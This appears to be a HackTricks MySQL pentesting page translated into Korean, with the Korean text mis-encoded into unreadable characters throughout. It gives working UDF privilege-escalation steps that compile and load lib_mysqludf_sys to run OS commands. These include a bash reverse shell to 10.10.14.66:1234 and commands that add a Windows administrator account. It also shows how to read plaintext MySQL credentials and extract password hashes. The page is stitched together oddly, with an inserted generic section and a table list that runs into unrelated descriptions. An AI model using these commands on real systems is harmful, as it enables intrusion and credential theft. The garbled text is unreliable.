ì•…ì„± ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” sqlmapê³¼ metasploit ë‚´ì—ì„œ **`locate "*lib_mysqludf_sys*"`** ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`.so`** íŒŒì¼ì€ **ë¦¬ëˆ…ìŠ¤** ë¼ì´ë¸ŒëŸ¬ë¦¬ì´ê³  **`.dll`** íŒŒì¼ì€ **Windows**ìš©ì…ë‹ˆë‹¤. í•„ìš”í•œ íŒŒì¼ì„ ì„ íƒí•˜ì„¸ìš”.

ë§Œì•½ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ **ê°€ì§€ê³  ìˆì§€ ì•Šë‹¤ë©´**, ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ **ì°¾ì•„ë³´ê±°ë‚˜**, ì´ [**ë¦¬ëˆ…ìŠ¤ C ì½”ë“œ**](https://www.exploit-db.com/exploits/1518)ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ì—¬ **ì·¨ì•½í•œ ë¦¬ëˆ…ìŠ¤ ë¨¸ì‹  ë‚´ì—ì„œ ì»´íŒŒì¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
ì´ì œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë¯€ë¡œ, íŠ¹ê¶Œ ì‚¬ìš©ì(root?)ë¡œ Mysqlì— ë¡œê·¸ì¸í•˜ê³  ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¥´ì‹­ì‹œì˜¤:

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### ìœˆë„ìš°

##### MySQL ì„œë¹„ìŠ¤ ê²€ì‚¬

MySQL ì„œë¹„ìŠ¤ëŠ” ì¼ë°˜ì ìœ¼ë¡œ 3306 í¬íŠ¸ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
netstat -ano | findstr :3306
```

ë§Œì•½ MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì´ë¼ë©´, ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¼ MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ íœí…ŒìŠ¤íŠ¸ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

##### MySQL ì„œë¹„ìŠ¤ íœí…ŒìŠ¤íŠ¸

1. **MySQL ì„œë¹„ìŠ¤ ë²„ì „ í™•ì¸**

   MySQL ì„œë¹„ìŠ¤ì˜ ë²„ì „ì„ í™•ì¸í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

   ```bash
   mysql -V
   ```

2. **MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ê¸°ë³¸ ì—°ê²°**

   MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ê¸°ë³¸ ì—°ê²°ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

   ```bash
   mysql -h <í˜¸ìŠ¤íŠ¸> -P <í¬íŠ¸> -u <ì‚¬ìš©ì> -p
   ```

   - `<í˜¸ìŠ¤íŠ¸>`: MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í˜¸ìŠ¤íŠ¸ì˜ IP ì£¼ì†Œ ë˜ëŠ” ë„ë©”ì¸ ì´ë¦„
   - `<í¬íŠ¸>`: MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í¬íŠ¸ ë²ˆí˜¸ (ì¼ë°˜ì ìœ¼ë¡œ 3306)
   - `<ì‚¬ìš©ì>`: MySQL ì„œë¹„ìŠ¤ì— ì—°ê²°í•  ì‚¬ìš©ì ì´ë¦„

   ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ê¸°ë³¸ ì—°ê²°ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤. ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë¼ëŠ” ë©”ì‹œì§€ê°€ í‘œì‹œë˜ë©´, ì˜¬ë°”ë¥¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì‹­ì‹œì˜¤.

3. **MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ìµëª… ì—°ê²°**

   MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ìµëª… ì—°ê²°ì„ ì‹œë„í•˜ì—¬ ìµëª… ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.

   ```bash
   mysql -h <í˜¸ìŠ¤íŠ¸> -P <í¬íŠ¸> -u anonymous
   ```

   - `<í˜¸ìŠ¤íŠ¸>`: MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í˜¸ìŠ¤íŠ¸ì˜ IP ì£¼ì†Œ ë˜ëŠ” ë„ë©”ì¸ ì´ë¦„
   - `<í¬íŠ¸>`: MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í¬íŠ¸ ë²ˆí˜¸ (ì¼ë°˜ì ìœ¼ë¡œ 3306)

   ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ ìµëª… ì‚¬ìš©ìë¡œ MySQL ì„œë¹„ìŠ¤ì— ì—°ê²°ë©ë‹ˆë‹¤. ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì§€ ì•Šì•„ë„ ì—°ê²°ì´ ì„±ê³µí•œë‹¤ë©´, MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ìµëª… ì—°ê²°ì´ í—ˆìš©ë˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

4. **MySQL ì„œë¹„ìŠ¤ ì‚¬ìš©ì ê³„ì • í…ŒìŠ¤íŠ¸**

   MySQL ì„œë¹„ìŠ¤ì— ëŒ€í•œ ì‚¬ìš©ì ê³„ì •ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

   ```bash
   mysql -h <í˜¸ìŠ¤íŠ¸> -P <í¬íŠ¸> -u <ì‚¬ìš©ì> -p
   ```

   - `<í˜¸ìŠ¤íŠ¸>`: MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í˜¸ìŠ¤íŠ¸ì˜ IP ì£¼ì†Œ ë˜ëŠ” ë„ë©”ì¸ ì´ë¦„
   - `<í¬íŠ¸>`: MySQL ì„œë¹„ìŠ¤ê°€ ì‹¤í–‰ ì¤‘ì¸ í¬íŠ¸ ë²ˆí˜¸ (ì¼ë°˜ì ìœ¼ë¡œ 3306)
   - `<ì‚¬ìš©ì>`: í…ŒìŠ¤íŠ¸í•  ì‚¬ìš©ì ê³„ì • ì´ë¦„

   ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ í•´ë‹¹ ì‚¬ìš©ì ê³„ì •ìœ¼ë¡œ MySQL ì„œë¹„ìŠ¤ì— ì—°ê²°ë©ë‹ˆë‹¤. ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë¼ëŠ” ë©”ì‹œì§€ê°€ í‘œì‹œë˜ë©´, ì˜¬ë°”ë¥¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì‹­ì‹œì˜¤.

5. **MySQL ì„œë¹„ìŠ¤ ë°ì´í„°ë² ì´ìŠ¤ ë° í…Œì´ë¸” í™•ì¸**

   MySQL ì„œë¹„ìŠ¤ì— ì—°ê²°ëœ í›„, ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ ë° í…Œì´ë¸”ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

   ```bash
   SHOW DATABASES;
   ```

   ```bash
   USE <ë°ì´í„°ë² ì´ìŠ¤>;
   SHOW TABLES;
   ```

   - `<ë°ì´í„°ë² ì´ìŠ¤>`: í™•ì¸í•  ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„

   ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ MySQL ì„œë¹„ìŠ¤ì— ì—°ê²°ëœ ë°ì´í„°ë² ì´ìŠ¤ ë° í•´ë‹¹ ë°ì´í„°ë² ì´ìŠ¤ì˜ í…Œì´ë¸” ëª©ë¡ì´ í‘œì‹œë©ë‹ˆë‹¤.

6. **MySQL ì„œë¹„ìŠ¤ ë°ì´í„°ë² ì´ìŠ¤ ë° í…Œì´ë¸” ë‚´ìš© í™•ì¸**

   MySQL ì„œë¹„ìŠ¤ì— ì—°ê²°ëœ í›„, ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ ë° í…Œì´ë¸”ì˜ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

   ```bash
   USE <ë°ì´í„°ë² ì´ìŠ¤>;
   SELECT * FROM <í…Œì´ë¸”>;
   ```

   - `<ë°ì´í„°ë² ì´ìŠ¤>`: í™•ì¸í•  ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„
   - `<í…Œì´ë¸”>`: í™•ì¸í•  í…Œì´ë¸” ì´ë¦„

   ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ í•´ë‹¹ í…Œì´ë¸”ì˜ ëª¨ë“  ë ˆì½”ë“œê°€ í‘œì‹œë©ë‹ˆë‹¤.
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### íŒŒì¼ì—ì„œ MySQL ìê²© ì¦ëª… ì¶”ì¶œí•˜ê¸°

_/etc/mysql/debian.cnf_ ë‚´ë¶€ì—ëŠ” ì‚¬ìš©ì **debian-sys-maint**ì˜ **í‰ë¬¸ ì•”í˜¸**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
cat /etc/mysql/debian.cnf
```
ë‹¤ìŒ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ mysql ë°ì´í„°ë² ì´ìŠ¤ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

íŒŒì¼ ë‚´ë¶€: _/var/lib/mysql/mysql/user.MYD_ ì—ì„œ **ëª¨ë“  MySQL ì‚¬ìš©ìì˜ í•´ì‹œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ë°ì´í„°ë² ì´ìŠ¤ ë‚´ë¶€ì˜ mysql.userì—ì„œ ì¶”ì¶œí•  ìˆ˜ ìˆëŠ” í•´ì‹œë“¤)_._

ì¶”ì¶œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### ë¡œê¹… í™œì„±í™”

`/etc/mysql/my.cnf` ë‚´ë¶€ì—ì„œ mysql ì¿¼ë¦¬ì˜ ë¡œê¹…ì„ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ë¼ì¸ë“¤ì„ ì£¼ì„ í•´ì œí•˜ë©´ ë©ë‹ˆë‹¤:

![](<../.gitbook/assets/image (277).png>)

### ìœ ìš©í•œ íŒŒì¼ë“¤

êµ¬ì„± íŒŒì¼

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* ëª…ë ¹ íˆìŠ¤í† ë¦¬
* \~/.mysql.history
* ë¡œê·¸ íŒŒì¼
* connections.log
* update.log
* common.log

## ê¸°ë³¸ MySQL ë°ì´í„°ë² ì´ìŠ¤/í…Œì´ë¸”

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory
## HackTricks ìë™ ëª…ë ¹ì–´

### schema\_table\_statistics
- ìŠ¤í‚¤ë§ˆì™€ í…Œì´ë¸”ì˜ í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### schema\_table\_statistics\_with\_buffer
- ë²„í¼ë¥¼ ì‚¬ìš©í•œ ìŠ¤í‚¤ë§ˆì™€ í…Œì´ë¸”ì˜ í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### schema\_tables\_with\_full\_table\_scans
- ì „ì²´ í…Œì´ë¸” ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ëŠ” ìŠ¤í‚¤ë§ˆì™€ í…Œì´ë¸”ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### schema\_unused\_indexes
- ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ì¸ë±ìŠ¤ë¥¼ ê°€ì§„ ìŠ¤í‚¤ë§ˆì™€ í…Œì´ë¸”ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### session
- í˜„ì¬ ì„¸ì…˜ì˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### session\_ssl\_status
- SSL ì—°ê²° ìƒíƒœì— ëŒ€í•œ ì„¸ì…˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### statement\_analysis
- SQL ë¬¸ì¥ ë¶„ì„ ê²°ê³¼ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### statements\_with\_errors\_or\_warnings
- ì˜¤ë¥˜ ë˜ëŠ” ê²½ê³ ê°€ í¬í•¨ëœ SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### statements\_with\_full\_table\_scans
- ì „ì²´ í…Œì´ë¸” ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### statements\_with\_runtimes\_in\_95th\_percentile
- ì‹¤í–‰ ì‹œê°„ì´ ìƒìœ„ 95%ì— í•´ë‹¹í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### statements\_with\_sorting
- ì •ë ¬ì„ ìˆ˜í–‰í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### statements\_with\_temp\_tables
- ì„ì‹œ í…Œì´ë¸”ì„ ì‚¬ìš©í•˜ëŠ” SQL ë¬¸ì¥ì˜ ëª©ë¡ì„ ì œê³µí•©ë‹ˆë‹¤.

### sys\_config
- ì‹œìŠ¤í…œ êµ¬ì„± ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### user\_summary
- ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### user\_summary\_by\_file\_io
- íŒŒì¼ I/Oì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### user\_summary\_by\_file\_io\_type
- íŒŒì¼ I/O ìœ í˜•ì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### user\_summary\_by\_stages
- ë‹¨ê³„ë³„ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### user\_summary\_by\_statement\_latency
- ë¬¸ì¥ ì§€ì—°ì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### user\_summary\_by\_statement\_type
- ë¬¸ì¥ ìœ í˜•ì— ë”°ë¥¸ ì‚¬ìš©ì ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### version
- MySQL ë²„ì „ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### wait\_classes\_global\_by\_avg\_latency
- í‰ê·  ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ ëŒ€ê¸° í´ë˜ìŠ¤ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### wait\_classes\_global\_by\_latency
- ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ ëŒ€ê¸° í´ë˜ìŠ¤ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### waits\_by\_host\_by\_latency
- í˜¸ìŠ¤íŠ¸ ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### waits\_by\_user\_by\_latency
- ì‚¬ìš©ì ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### waits\_global\_by\_latency
- ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$host\_summary
- í˜¸ìŠ¤íŠ¸ ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$host\_summary\_by\_file\_io
- íŒŒì¼ I/Oì— ë”°ë¥¸ í˜¸ìŠ¤íŠ¸ ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$host\_summary\_by\_file\_io\_type
- íŒŒì¼ I/O ìœ í˜•ì— ë”°ë¥¸ í˜¸ìŠ¤íŠ¸ ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$host\_summary\_by\_stages
- ë‹¨ê³„ë³„ í˜¸ìŠ¤íŠ¸ ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$host\_summary\_by\_statement\_latency
- ë¬¸ì¥ ì§€ì—°ì— ë”°ë¥¸ í˜¸ìŠ¤íŠ¸ ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$host\_summary\_by\_statement\_type
- ë¬¸ì¥ ìœ í˜•ì— ë”°ë¥¸ í˜¸ìŠ¤íŠ¸ ìš”ì•½ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$innodb\_buffer\_stats\_by\_schema
- ìŠ¤í‚¤ë§ˆë³„ InnoDB ë²„í¼ í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$innodb\_buffer\_stats\_by\_table
- í…Œì´ë¸”ë³„ InnoDB ë²„í¼ í†µê³„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$innodb\_lock\_waits
- InnoDB ë½ ëŒ€ê¸° ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$io\_by\_thread\_by\_latency
- ìŠ¤ë ˆë“œ ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ I/O ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$io\_global\_by\_file\_by\_bytes
- íŒŒì¼ ë° ë°”ì´íŠ¸ì— ë”°ë¥¸ ì „ì—­ I/O ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$io\_global\_by\_file\_by\_latency
- íŒŒì¼ ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ I/O ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$io\_global\_by\_wait\_by\_bytes
- ëŒ€ê¸° ë° ë°”ì´íŠ¸ì— ë”°ë¥¸ ì „ì—­ I/O ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$io\_global\_by\_wait\_by\_latency
- ëŒ€ê¸° ë° ëŒ€ê¸° ì‹œê°„ì— ë”°ë¥¸ ì „ì—­ I/O ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$latest\_file\_io
- ìµœì‹  íŒŒì¼ I/O ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$memory\_by\_host\_by\_current\_bytes
- í˜¸ìŠ¤íŠ¸ ë° í˜„ì¬ ë°”ì´íŠ¸ì— ë”°ë¥¸ ë©”ëª¨ë¦¬ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$memory\_by\_thread\_by\_current\_bytes
- ìŠ¤ë ˆë“œ ë° í˜„ì¬ ë°”ì´íŠ¸ì— ë”°ë¥¸ ë©”ëª¨ë¦¬ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### x$memory\_by\_user\_by\_current\_bytes
- ì‚¬ìš©ì ë° í˜„ì¬ ë°”ì´íŠ¸ì— ë”°ë¥¸ ë©”ëª¨ë¦¬ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

